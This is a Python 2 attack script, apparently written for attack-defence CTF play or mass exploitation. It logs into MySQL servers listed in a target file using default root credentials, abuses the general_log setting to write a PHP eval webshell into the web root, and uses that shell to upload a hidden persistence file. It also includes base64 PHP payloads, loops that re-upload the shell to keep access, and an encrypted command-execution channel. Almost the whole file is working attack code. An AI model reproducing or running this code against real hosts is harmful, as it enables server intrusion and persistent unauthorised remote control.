#!/usr/bin/python
# -*- coding: UTF-8 -*-
# made by 3s_NwGeek
# from multiprocessing.dummy import Pool as ThreadPool
import requests,random,MySQLdb,re,base64
import time
from gevent import monkey
from gevent.pool import Pool
from bs4 import BeautifulSoup
from urllib import unquote
from hashlib import md5
monkey.patch_all()
passwd = 'ts@hack'

# 目标主机
# target = '127.0.0.1:80'
username="root"#一定要root权限才可以有效写文件
login_psw="root"
webshell_path= 'http://TARGET_IP/service.php'#要跟查询路径的文件名相同！！！！！！！！！
webshell_psw='cmd'
localfile = 'D:\\installed_software\\phpstudy\\WWW\\mixV2.drt'  # 本地待上传的文件名
# print 'set password for root@localhost = password("%s"); '%change_pwd
#Secure_file_priv <5.5.53可以直接loadfile读flag，然后命令行curl提交，大于不行
# #路径要改,log_file = 'C:/phpstudy/WWW/test1.php'一定要跟上面webshell_path保持统一文件名
webroot='C:/Wamp/httpd-2.2.15/htdocs'
cmd='del %s/service.php'%webroot
sqlquerys=('''select @@version;
set global general_log = off;
set global general_log = on;
set global general_log_file = '%s/service.php';
select "<?php phpinfo();eval($_POST['cmd']);exit();?>";
set global general_log = off;'''%webroot).splitlines()
bakup_webshell_url='''http://TARGET_IP/index.php
http://TARGET_IP/light.php'''.splitlines()

#批量目标主机
targets=open("C:\Users\\3s_NwGeek\Desktop\\target.txt").read().splitlines()#批量目标
localfile_content = open(localfile, 'rb').read()
def main(target):

    while True:
        usual_get(target)
        webshell_url=upupup(target)
        #读取url  php -loadip 、reupload、get ?_、norespond、random get
        # print webshell_url,'testing!!!!'
        if not webshell_url:
            print 'if not webshell_url and continute'
            continue
        elif 'http' not in webshell_url:
            time.sleep(3)
            # print "主循环一次"
            print 'elif http not in webshell_url:'
            continue

        tar,res=maintain_webshell(webshell_url,target)
        if len(res)>0:
            random_get(target,res)
        else:
            # print len(res),res
            pass
        time.sleep(5)
        # print "主循环一次"

def upupup(target):#上传
    try:
        conn = MySQLdb.connect(host=target, user=username, passwd=login_psw,port=3306,connect_timeout=1)
        print target,':login scceuss'
        time.sleep(0.5)
        cursor = conn.cursor()
        # 使用execute方法执行SQL语句
        # cursor.execute('set password for root@localhost = password("%s"); '%change_pwd)
        for sql_q in sqlquerys:
            cursor.execute(sql_q)
            time.sleep(0.5)
            data = cursor.fetchone()
            if data:
                print "%s return : %s " % (target, data)
        # 使用 fetchone() 方法获取一条数据
        # 关闭数据库连接
        conn.close()
        reg = ".*/([^/]*\.php?)"
        w_path = webshell_path.replace('TARGET_IP', target)
        print w_path
        match_shell_name = re.search(reg, w_path)
        if match_shell_name:
            shell_name = match_shell_name.group(1)  # 1.php
            shell_path = ""
            try:
                data = {}
                data[webshell_psw] = '@eval(base64_decode($_POST[z0]));'
                data['z0'] = 'ZWNobyAnIS1fLSEtXy0hJy4kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLichLV8tIS1fLSEnOw=='
                shell_path = re.findall(re.compile(r'\!-_-\!-_-\!.+\!-_-\!-_-\!'), requests.post(w_path, data).text.strip())[0].replace('!-_-!-_-!', '')
                # print shell_path
                target_path = shell_path.split(shell_name)[0].replace('TARGET_IP', target)  + '/.Conf_check.php' # 获取上传绝对路径文件地址
                # print 'target_path:',target_path
                target_path_base64 = base64.b64encode(target_path)
                # print w_path,w_path.split(shell_name)
                target_file_url = w_path.split(shell_name)[0].replace('TARGET_IP', target) + '/.Conf_check.php'  # 上传url地址
                # print 'target_file_url:',target_file_url
                data = {}
                data[webshell_psw] = '@eval(base64_decode($_POST[z0]));'
                data[
                    'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRidWY9IiI7CmZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTEpCiAgICAkYnVmLj1zdWJzdHIoJGMsJGksMSk7CmVjaG8oQGZ3cml0ZShmb3BlbigkZiwidyIpLCRidWYpKTsKZWNobygifDwtIik7CmRpZSgpOw=='
                data['z1'] = target_path_base64
                data['z2'] = base64.b64encode(localfile_content)
                # print 'webshell_path:',w_path,data
                requests.post(w_path , data).text.strip()
                if 'check_url' in requests.get(target_file_url + "?_").content:
                    print target,':getshell success!!!!!!!!!!!!!!',excmd(target_file_url, passwd, cmd, encoding='utf-8')

                    return target_file_url.replace('TARGET_IP', target)
            except Exception as e:
                if 'list out of range' in str(e):
                    print target,'日志获取根路径错误：target_path'
                print e
                pass
    except Exception as e:
        print target+' is no vul:','有可能输入格式错误',e



def maintain_webshell(webshell_url, target, Timeout=5):#检测函数，返回检测目标，检测结果
    # print "进入maintain_webshell()"
    webshell_url = webshell_url.replace('TARGET_IP', target)
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'}
    try:
        r=requests.get(webshell_url + '?_', headers=head,timeout=15,proxies={'http': 'http://127.0.0.1:8080'})
        # print r.content
        # html=BeautifulSoup(r.content.decode('gb2312','ignore'),'lxml')#注意根据实际情况编码
        html = BeautifulSoup(r.content, 'lxml', from_encoding="utf8")  # 注意根据实际情况编码
        checks_arr = html.find_all(attrs={'id': 'check_url'})#获取url
        if len(checks_arr)<2:#爬取失败重传马
            print target,"%s 获取phpurl：%d 状态码 %d webshell失效，正在尝试重传webshell\n" % (webshell_url,len(checks_arr),r.status_code)
            time.sleep(0.5)
            webshell_url, check_res=maintain_webshell(upupup(target), target)#感觉有问题，导致res数量变化
            # usual_get(target)
        else:
            check_res = []
            for check_str in checks_arr:
                check_res.append(check_str.string)

        print "权限维持成功:",target,len(check_res),webshell_url
        # print "跳出maintain_webshell():find_allphp"
        return webshell_url, check_res
    except Exception as e:
        if 'timeout' in str(e):
            RCE_res=excmd(webshell_url, passwd, 'echo testRCE')
            if RCE_res:
                print target,'：执行命令成功，但感染超时，请使用轻便版--------->',RCE_res
                return webshell_url,bakup_webshell_url
            else:
                print target+'：执行命令失败，可能权限不足感染失败，或者php遍历函数被禁，or 主机连接失败'
        print target,'err from maintain_webshell',e
        # print "跳出maintain_webshell():err"
        return webshell_url,[]

def random_get(target,res):
    try:
        # print "进入random_get"
        buff=res
        while len(res)>1:
            ran_url=random.sample(buff,1)[0]
            ran_url, res = maintain_webshell(ran_url, target)
            if len(res)<2:#失效情况下
                random.shuffle(buff)
                for url in buff:
                    url, res = maintain_webshell(url, target)
                    if len(res)>2:
                        buff=res
                        break
                    print target,'该webshell失效，正在尝试缓存buff'
            elif len(res)>=2:#成功情况下
                buff=list(set(buff+res))
                # print buff
                print len(buff)
                time.sleep(3)
            else:
                print "random_get又给我出现什么bug了，res：",res,"buff:",buff


        usual_get(target)
        # print "跳出random_get()"# print '权限维持成功：', len(res),r, res
    except Exception as e:
        print '%s   "err from random_get"：上传webshell_url错误！:%s'%(target,e)
        pass

def usual_get(target):
    try:
        # print "进入usual_get()"
        base_url='http://'+target+'/.Conf_check.php'
        w_url,res=maintain_webshell(base_url,target)
        if len(res)>1:
            # print res
            random_get(target,res)
        # print "跳出usual_get()"
    except:
        pass
################以下为命令执行函数
def getSerTime(url):
    ser_time_format = '%a, %d %b %Y %H:%M:%S GMT'
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'}
    r = requests.get(url, allow_redirects=False,headers=head,proxies={'http': 'http://127.0.0.1:8080'})
    if r.headers['Date']:
        stimestrp = time.strptime(r.headers['Date'], ser_time_format)
        stime = time.mktime(stimestrp) + 60 * 60 * 8    # GMT + 8 时区
        timeskew = int(time.time()) - int(stime)
        return timeskew
    else:
        return None
# 加密
def encrypt(string, salt, encoding='utf-8'):
    estring = ''
    b64string = base64.b64encode(string.encode(encoding)).decode('utf-8')
    for n, char in enumerate(b64string):
        estring += chr(ord(char) ^ n % salt)
    return estring
# 解密
def decrypt(estring, salt, encoding='utf-8'):
    data=estring[::-1].replace('cAFAcABAAswTA2GE2c','i').replace(':kcehc_revres','=').encode('unicode_escape').decode("string_escape")
    string=unquote(base64.urlsafe_b64decode(data))
    # string=unicode(string, "gb2312").encode("utf8")#有中文乱码去掉这个注释
    return string
# 命令执行
def excmd(url, passwd, cmd, encoding='utf-8'):
    try:
        timeskew = getSerTime('/'.join(url.split('/')[:-1]))
        # 校对服务器时间，防止时间差造成API校验失败
        nowtime = int(time.time())
        if timeskew == None:
            print('检查服务器时间出错，请手动确认服务器时间！')
            # 手动获取服务器时间戳，并保存到servtime变量中，int类型
            # Linux下获取方法： date +%s
            # Windows的话，还是运行Python, time.time()吧，放弃治疗
            servtime = time.time()
            nowtime = servtime
        else:
            nowtime -= timeskew
        # 开始发起请求
        passwd = md5(passwd.encode('utf-8')).hexdigest()
        salt = int(random.random() * 100)
        ecmd = encrypt(cmd, salt)
        sign_tmp = ecmd + passwd + str(nowtime) + str(salt)
        sign = md5(sign_tmp.encode('utf-8')).hexdigest()
        parameters = {
            'time': nowtime,
            'check': ecmd,
            'salt': salt,
            'sign': sign
        }
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'}
        r = requests.get(url, params=parameters, headers=head,proxies={'http': 'http://127.0.0.1:8080'},timeout=3)
        # r = requests.post(url, data=parameters, headers=head, proxies={'http': 'http://127.0.0.1:8080'}),
        if '0:' in r.text:print '执行成功：',
        res = decrypt(r.content.decode('utf-8').replace('0:',''), salt, encoding)
        return res
    except Exception as e:
        pass
        print(url,'参数配置错误，连接异常err:%s'%str(e))
        # traceback.print_exc()

if __name__ == '__main__':

    # main(target)
    pool = Pool(len(targets))#批量
    pool.map(main, targets)
    # print targets
    # pool = ThreadPool(len(targets))
    # pool.map(main,targets)#